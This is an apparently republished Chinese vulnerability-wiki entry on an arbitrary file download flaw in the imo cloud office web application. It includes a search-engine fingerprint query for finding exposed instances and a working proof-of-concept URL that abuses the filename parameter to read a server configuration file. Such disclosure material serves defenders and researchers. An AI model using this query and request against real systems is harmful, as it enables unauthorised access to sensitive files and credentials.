---
title: "imo 云办公室 Imo_DownLoadUI.php 任意文件下载漏洞"
date: 2026-10-16 09:09:51
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "imo-云办公室"
tags:
  - "imo-云办公室"
  - "任意文件下载"
  - "漏洞复现"
---
## 漏洞描述

imo 云办公室 由于 /file/Placard/upload/Imo_DownLoadUI.php 页面 filename 参数过滤不严，导致可以读取系统敏感文件。

## 漏洞影响

```
imo 云办公室
```

## 网络测绘

```
app="iMO-云办公室"
```

## 漏洞复现

登录页面

![image-20220524171455819](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241714963.png)

验证POC

```
/file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php
```

![image-20220524171627797](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241716860.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-Imo_DownLoadUI.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
